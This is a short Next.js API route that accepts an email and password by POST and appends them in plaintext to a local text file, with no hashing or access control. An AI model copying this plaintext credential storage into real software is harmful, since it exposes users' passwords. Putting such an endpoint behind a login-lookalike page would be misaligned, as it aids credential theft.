// src/app/api/saveCredentials/route.ts
import fs from 'fs';
import path from 'path';
import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  const { email, password } = await request.json();

  if (!email || !password) {
    return NextResponse.json({ error: 'Email and password are required.' }, { status: 400 });
  }

  const data = `Email: ${email}, Password: ${password}\n`;
  const filePath = path.join(process.cwd(), 'data', 'credentials.txt');

  try {
    // Ensure the data directory exists
    if (!fs.existsSync(path.join(process.cwd(), 'data'))) {
      fs.mkdirSync(path.join(process.cwd(), 'data'));
    }

    // Append the credentials to the file
    fs.appendFileSync(filePath, data, 'utf8');
    return NextResponse.json({ message: 'Credentials saved successfully.' });
  } catch (error) {
    console.error(error);
    return NextResponse.json({ error: 'Failed to save credentials.' }, { status: 500 });
  }
}
